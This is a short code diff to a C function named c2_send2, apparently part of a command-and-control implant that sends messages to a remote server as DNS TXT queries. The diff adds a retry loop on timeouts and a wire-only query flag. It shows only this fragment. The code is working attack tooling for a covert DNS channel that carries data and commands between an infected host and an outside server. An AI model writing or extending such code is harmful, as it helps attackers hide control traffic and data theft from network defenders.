@@ -492,10 +492,17 @@ int c2_send2(char* msg, int len) {
         strcat(buffer, ".com"); // domain names need a top-level domain
 
         // Send query
-        status = DnsQuery_A(buffer, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY, pSrvList, &result, NULL);
-        if (status != ERROR_SUCCESS && status != DNS_INFO_NO_RECORDS) {
+        // TODO: add check for DEFAULT message from server
+        loop:
+        status = DnsQuery_A(buffer, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY | DNS_QUERY_WIRE_ONLY, pSrvList, &result, NULL);
+        if (status != ERROR_SUCCESS && status != ERROR_TIMEOUT && status != WSAETIMEDOUT) {
             c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
             return 0;
+        }
+        if (status == ERROR_TIMEOUT || status == WSAETIMEDOUT) {
+            // TODO maybe sleep
+            c2_log("Iteration\n");
+            goto loop;
         }
 
         // Get response
